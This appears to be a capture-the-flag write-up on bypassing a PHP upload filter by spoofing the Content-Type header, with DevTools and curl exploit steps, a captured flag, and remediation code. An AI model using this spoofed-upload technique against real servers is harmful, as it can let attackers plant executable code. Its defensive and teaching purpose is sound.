# Content-Type File Upload Bypass — Documentation

## How I Found It

**Initial reconnaissance:**
- Visited `http://192.168.1.16/index.php?page=upload`
- Tested file uploads:
  - JPEG → ✓ accepted
  - PHP → ✗ rejected with error
- Hypothesis: Server validates Content-Type header only

**Testing:**
- Opened Firefox DevTools → Network tab
- Uploaded PHP file, observed Content-Type: `application/x-php`
- Used "Edit and Resend" to change Content-Type to `image/jpeg`
- Upload succeeded → vulnerability confirmed

## How I Exploited It

**Method 1: Firefox Developer Tools**

1. Create payload:
```bash
echo '<?php echo "I am bad"; ?>' > /tmp/bad.php
```

2. Open Firefox DevTools (F12) → Network tab

3. Upload `/tmp/bad.php` and capture the request

4. Right-click request → **Edit and Resend**

5. Modify Content-Type:
```
Content-Type: application/x-php    ← Change this
Content-Type: image/jpeg           ← To this
```

6. Click Send → Flag revealed in response

---

**Method 2: cURL**
```bash
echo '<?php echo "I am bad"; ?>' > /tmp/bad.php && \
curl -X POST \
  -F "Upload=Upload" \
  -F "uploaded=@/tmp/bad.php;type=image/jpeg" \
  "http://192.168.1.16/index.php?page=upload" \
  | grep 'The flag is :'
```

**Flag obtained:**
```
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

## Why It Works

**Vulnerabilities:**
1. **Header-only validation** → Server trusts client-supplied Content-Type
2. **No magic byte check** → Doesn't verify actual file signatures (JPEG: `FF D8 FF`, PNG: `89 50 4E 47`)
3. **No extension whitelist** → Accepts dangerous `.php` files
4. **Potential RCE** → If uploads stored in executable directory

**Related:**
- CWE-434: Unrestricted Upload of File with Dangerous Type
- OWASP A08:2021 – Software and Data Integrity Failures

## How to Fix It

**Immediate fixes:**

1. **Validate extension:**
```php
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['uploaded']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) die("Invalid type");
```

2. **Check magic bytes:**
```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['uploaded']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png'])) die("Not an image");
```

3. **Rename files:**
```php
$new_name = bin2hex(random_bytes(16)) . '.jpg';
```

4. **Disable execution (Nginx):**
```nginx
location /uploads/ {
    location ~ \.php$ { deny all; }
}
```

**Long-term improvements:**

1. **Re-encode images** (strips malicious code):
```php
$img = imagecreatefromjpeg($tmp);
imagejpeg($img, $dest, 90);
```

2. **Store outside web root**
3. **File size limits** (5MB max)
4. **Logging and monitoring**


## References

- OWASP File Upload Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- CWE-434 — https://cwe.mitre.org/data/definitions/434.html